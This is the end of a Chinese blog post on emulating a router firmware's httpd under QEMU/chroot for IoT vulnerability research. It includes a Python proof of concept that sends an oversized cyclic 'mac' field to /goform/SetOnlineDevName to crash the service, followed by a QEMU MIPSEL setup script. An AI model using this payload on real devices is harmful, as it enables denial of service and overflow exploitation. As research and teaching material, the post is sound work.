+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line"># 挂载传感器</span><br><span class="line">mount -t proc /proc ./proc</span><br><span class="line">mount -t sysfs /sys ./sys</span><br><span class="line">mount --bind /dev ./dev</span><br><span class="line"></span><br><span class="line"># 模拟路由器的“开机启动”</span><br><span class="line">mkdir -p ./var/run ./var/etc ./var/webroot ./etc</span><br><span class="line">cp -rf ./etc_ro/* ./etc/</span><br><span class="line">cp -rf ./etc_ro/* ./var/etc/</span><br><span class="line">cp -rf ./webroot_ro/* ./var/webroot</span><br><span class="line"># 补上那个关键软链接</span><br><span class="line">ln -snf ./var/webroot ./webroot</span><br><span class="line"></span><br><span class="line"># 设置根目录启动 httpd</span><br><span class="line">chroot . ./bin/httpd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>脚本要把ip地址改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import cyclic</span><br><span class="line"></span><br><span class="line">ip = &#x27;10.10.10.3&#x27; # 填网桥 IP</span><br><span class="line">url =  f&#x27;http://&#123;ip&#125;/goform/SetOnlineDevName&#x27;</span><br><span class="line"></span><br><span class="line"># 结合优势：攻击 mac 字段，并使用 4000 字节的超大探针！</span><br><span class="line">payload = &#123;</span><br><span class="line">  &quot;mac&quot;: cyclic(4000), </span><br><span class="line">  &quot;devName&quot;: &quot;devname1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在发送 4000 字节的终极探针...&quot;)</span><br><span class="line">try:</span><br><span class="line">    requests.post(url=url , data=payload, timeout=2)</span><br><span class="line">except Exception:</span><br><span class="line">    print(&quot;[+] 目标已彻底断开，绝对当场暴毙！&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406163500770.png"  alt="image-20260406163500770"></p>
+<p>最后再放一个模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># ==============================================</span><br><span class="line"># QEMU MIPSEL Debian Squeeze 虚拟机安装脚本（带校验功能）</span><br><span class="line"># 适用于嵌入式开发/逆向工程环境搭建</span><br><span class="line"># ==============================================</span><br><span class="line"></span><br><span class="line"># 配置参数</span><br><span class="line">WORK_DIR=&quot;debian-mipsel-qemu&quot;</span><br><span class="line">IMAGE_FILE=&quot;debian_squeeze_mipsel_standard.qcow2&quot;</span><br><span class="line">KERNEL_FILE=&quot;vmlinux-2.6.32-5-4kc-malta&quot;</span><br><span class="line">START_SCRIPT=&quot;start.sh&quot;</span><br><span class="line"></span><br><span class="line"># 1. 创建工作目录（如果不存在）</span><br><span class="line">if [ ! -d &quot;$WORK_DIR&quot; ]; then</span><br><span class="line">    echo &quot;创建目录 $WORK_DIR...&quot;</span><br><span class="line">    mkdir -p &quot;$WORK_DIR&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd &quot;$WORK_DIR&quot; || &#123; echo &quot;无法进入目录 $WORK_DIR&quot;; exit 1; &#125;</span><br><span class="line"></span><br><span class="line"># 2. 下载镜像文件（如果不存在）</span><br><span class="line">download_file() &#123;</span><br><span class="line">    local url=$1</span><br><span class="line">    local file=$2</span><br><span class="line">    if [ ! -f &quot;$file&quot; ]; then</span><br><span class="line">        echo &quot;正在下载 $file...&quot;</span><br><span class="line">        wget &quot;$url&quot; -O &quot;$file&quot; || &#123; echo &quot;下载失败&quot;; exit 1; &#125;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$file 已存在，跳过下载&quot;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download_file &quot;https://people.debian.org/~aurel32/qemu/mipsel/$IMAGE_FILE&quot; &quot;$IMAGE_FILE&quot;</span><br><span class="line">download_file &quot;https://people.debian.org/~aurel32/qemu/mipsel/$KERNEL_FILE&quot; &quot;$KERNEL_FILE&quot;</span><br><span class="line"></span><br><span class="line"># 3. 生成或覆盖启动脚本</span><br><span class="line">echo &quot;生成启动脚本...&quot;</span><br><span class="line">cat &gt; &quot;$START_SCRIPT&quot; &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -nographic \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot;</span><br><span class="line">EOF</span><br><span class="line">chmod +x &quot;$START_SCRIPT&quot;</span><br><span class="line"></span><br><span class="line"># 4. 检查是否所有文件都已准备就绪</span><br><span class="line">required_files=(&quot;$IMAGE_FILE&quot; &quot;$KERNEL_FILE&quot; &quot;$START_SCRIPT&quot;)</span><br><span class="line">missing_files=()</span><br><span class="line"></span><br><span class="line">for file in &quot;$&#123;required_files[@]&#125;&quot;; do</span><br><span class="line">    if [ ! -f &quot;$file&quot; ]; then</span><br><span class="line">        missing_files+=(&quot;$file&quot;)</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ $&#123;#missing_files[@]&#125; -ne 0 ]; then</span><br><span class="line">    echo &quot;错误：以下文件缺失:&quot;</span><br><span class="line">    printf &#x27; - %s\n&#x27; &quot;$&#123;missing_files[@]&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># 5. 启动虚拟机</span><br><span class="line">echo &quot;正在启动QEMU虚拟机...&quot;</span><br><span class="line">./&quot;$START_SCRIPT&quot;</span><br></pre></td></tr></table></figure>
+
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/mips/">mips</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/iot/">iot</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/04/08/hello-world/"
+                                   title="Hello World"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Hello World</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/03/30/mips%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"
+                                   title="mips汇编学习"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">mips汇编学习</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
